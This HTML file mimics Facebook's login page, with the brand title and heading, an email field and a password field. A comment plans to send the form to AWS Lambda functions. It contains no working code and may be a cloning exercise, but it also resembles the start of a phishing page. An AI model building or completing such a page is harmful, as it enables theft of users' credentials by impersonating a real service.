<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Facebook - Log In or Sign Up</title>
</head>
<body>
    <div class="login-form">
        <center>
            <h1>Facebook</h1>
            <!-- Action will be to invoke AWS Lambda Functions -->
            <form action="">
                    <input id="username" class="login-form_field" type="text" placeholder="Email or phone number">
                    <input id="password" class="login-form_field" type="password" placeholder="Password">
                    <button id="login-btn" type="submit" name="login">Log In</button>
            </form>
        </center>
    </div>
</body>
</html>
